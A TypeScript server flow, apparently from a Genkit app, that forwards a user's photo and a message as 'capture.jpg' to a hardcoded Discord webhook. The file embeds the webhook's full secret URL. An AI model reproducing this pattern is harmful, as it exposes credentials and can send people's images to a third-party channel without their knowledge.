'use server';
/**
 * @fileOverview A flow to send a message and a photo to a Discord webhook.
 *
 * - sendWebhook - A function that takes a photo and sends it to a hardcoded Discord webhook.
 * - SendWebhookInput - The input type for the sendWebhook function.
 */

import { ai } from '@/ai/genkit';
import { z } from 'zod';

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1422514402111787040/0HTb2CLMLCJn8w7T2h0PA-yfFJ5bNI1ZTYewt0fhp51jG4je89PgmdfpYB3z3icIoHys';

const SendWebhookInputSchema = z.object({
  photoDataUri: z
    .string()
    .describe(
      "A photo of the user, as a data URI that must include a MIME type and use Base64 encoding. Expected format: 'data:<mimetype>;base64,<encoded_data>'."
    ),
  message: z.string().describe('The message to send with the photo.'),
});
export type SendWebhookInput = z.infer<typeof SendWebhookInputSchema>;

async function dataUriToBlob(dataUri: string): Promise<Blob> {
    const response = await fetch(dataUri);
    const blob = await response.blob();
    return blob;
}

export async function sendWebhook(input: SendWebhookInput): Promise<void> {
  return sendWebhookFlow(input);
}

const sendWebhookFlow = ai.defineFlow(
  {
    name: 'sendWebhookFlow',
    inputSchema: SendWebhookInputSchema,
    outputSchema: z.void(),
  },
  async (input) => {
    const imageBlob = await dataUriToBlob(input.photoDataUri);

    const formData = new FormData();
    formData.append('content', input.message);
    formData.append('file', imageBlob, 'capture.jpg');

    try {
      const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        body: formData,
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error('Failed to send webhook:', response.status, errorText);
        throw new Error(`Failed to send webhook: ${response.status}`);
      }
    } catch (error) {
      console.error('Error sending webhook:', error);
      throw error;
    }
  }
);
